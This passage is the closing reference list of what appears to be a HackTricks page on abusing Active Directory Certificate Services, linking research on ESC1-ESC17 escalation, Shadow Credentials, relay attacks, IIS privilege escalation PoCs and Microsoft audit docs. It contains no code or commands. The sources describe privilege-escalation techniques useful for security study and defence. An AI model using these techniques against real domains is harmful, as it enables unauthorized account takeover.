- [2] [H0j3n - Certighost technical analysis](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services の悪用](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9、ESC10、BloodHound GUI、新しい Authentication および Request Method など](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Account Takeover のための Key Trust Account Mapping の悪用](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Enhanced Key (mis)Usage の物語](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – RPC 経由での AD Certificate Services への Relay](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: YubiHSM を使用した ADCS CA への Shell access](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – ADCS ESC13 Abuse Technique](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Privilege Escalation (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: AD CS ESC はこれだけではない](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Misconfiguration and Exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – “Delegate 2 Thyself” の再検討](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – IIS AD CS enrollment PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – AD CS RPC Endpoint 経由での IIS AppPool からの Privilege Escalation](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Application Pool Identities](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – pkcs12 command](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Audit Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Event 4768: Kerberos authentication ticket が要求された](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Event 4769: Kerberos service ticket が要求された](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – AD CS PowerShell exploitation toolkit](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
